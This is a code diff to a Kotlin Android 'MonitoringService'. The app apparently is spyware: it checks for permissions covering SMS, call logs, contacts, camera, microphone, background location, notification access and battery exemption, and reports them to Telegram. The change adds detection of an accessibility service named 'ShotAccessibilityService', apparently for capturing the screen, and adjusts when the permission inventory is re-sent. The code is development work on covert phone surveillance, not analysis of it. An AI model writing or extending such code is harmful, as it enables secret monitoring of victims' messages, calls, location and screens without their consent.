@@ -9001,7 +9001,7 @@ class MonitoringService : Service() {
             val raw = permissionRawStates()
             val stored = try { preferencesManager.permSnapshot } catch (_: Exception) { -1 }
             val cur = PermReport.mask(raw, notifEnabled, stored)
-            if (stored == -1) {
+            if (!PermReport.hasCurrentLayout(stored)) {
                 try { preferencesManager.setPermSnapshotSync(cur) } catch (_: Exception) { }
                 sendToTelegram(PermReport.inventoryText(raw, notifEnabled, permLabels))
                 return
@@ -9057,7 +9057,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private val permLabels = arrayOf("Baca SMS", "Log panggilan", "Kontak", "Kirim SMS", "Kamera", "Mikrofon", "Lokasi", "Lokasi latar", "Akses notifikasi", "Baterai tanpa batas")
+    private val permLabels = arrayOf("Baca SMS", "Log panggilan", "Kontak", "Kirim SMS", "Kamera", "Mikrofon", "Lokasi", "Lokasi latar", "Akses notifikasi", "Aksesibilitas", "Baterai tanpa batas")
 
     private fun permissionRawStates(): BooleanArray {
         val notifEnabled = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
@@ -9071,6 +9071,7 @@ class MonitoringService : Service() {
             hasFineLocation(),
             hasBackgroundLocation(),
             !notifEnabled || isNotifForwarding(),
+            ShotAccessibilityService.isEnabled(this),
             isBatteryExempt()
         )
     }
